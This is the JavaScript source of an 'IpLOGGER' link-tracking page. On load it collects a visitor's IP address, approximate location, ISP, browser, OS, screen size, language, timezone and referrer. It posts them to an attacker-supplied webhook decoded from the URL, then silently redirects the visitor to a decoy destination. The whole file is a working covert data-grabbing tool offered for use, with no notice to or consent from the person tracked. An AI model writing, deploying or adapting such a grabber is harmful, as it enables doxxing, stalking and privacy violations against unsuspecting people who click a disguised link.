document.addEventListener('DOMContentLoaded', async () => {
    const urlParams = new URLSearchParams(window.location.search);
    const encodedData = urlParams.get('data');
    
    if (!encodedData) {
        window.location.href = 'index.html';
        return;
    }
    
    const data = Utils.decodeData(encodedData);
    
    if (!data || !data.webhook || !data.redirect || !data.id) {
        window.location.href = 'index.html';
        return;
    }
    
    try {
        const deviceInfo = Utils.getDeviceInfo();
        const ipInfo = await Utils.fetchIpInfo();
        const timestamp = new Date().toISOString();
        
        const payload = {
            embeds: [
                {
                    title: '📡 Visitor Tracked',
                    color: 3447003,
                    description: data.message,
                    fields: [
                        {
                            name: 'IP Information',
                            value: `**IP:** ${ipInfo.ip || 'Unknown'}\n**Location:** ${ipInfo.city || 'Unknown'}, ${ipInfo.region || ''}, ${ipInfo.country || 'Unknown'}\n**ISP:** ${ipInfo.org || 'Unknown'}`,
                            inline: false
                        },
                        {
                            name: 'Device Information',
                            value: `**Browser:** ${getBrowser(deviceInfo.userAgent)}\n**OS:** ${getOS(deviceInfo.userAgent)}\n**Screen:** ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n**Window:** ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}`,
                            inline: false
                        },
                        {
                            name: 'Additional Information',
                            value: `**Language:** ${deviceInfo.language}\n**Timezone:** ${deviceInfo.timezone}\n**Referrer:** ${deviceInfo.referrer || 'Direct'}\n**Visit ID:** ${data.id}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `IpLOGGER | Made by b70ga • ${formatDate(timestamp)}`
                    }
                }
            ]
        };
        
        const response = await fetch(data.webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            console.error('Failed to send webhook');
        }
        
    } catch (error) {
        console.error('Error:', error);
    } finally {
        window.location.href = data.redirect;
    }
});

function getBrowser(userAgent) {
    const ua = userAgent.toLowerCase();
    
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('edg')) return 'Edge';
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('safari')) return 'Safari';
    if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
    
    return 'Unknown';
}

function getOS(userAgent) {
    const ua = userAgent.toLowerCase();
    
    if (ua.includes('windows')) return 'Windows';
    if (ua.includes('mac os') || ua.includes('macos')) return 'macOS';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
    if (ua.includes('linux')) return 'Linux';
    
    return 'Unknown';
}

function formatDate(timestamp) {
    const date = new Date(timestamp);
    const options = {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    
    return date.toLocaleDateString('en-US', options);
}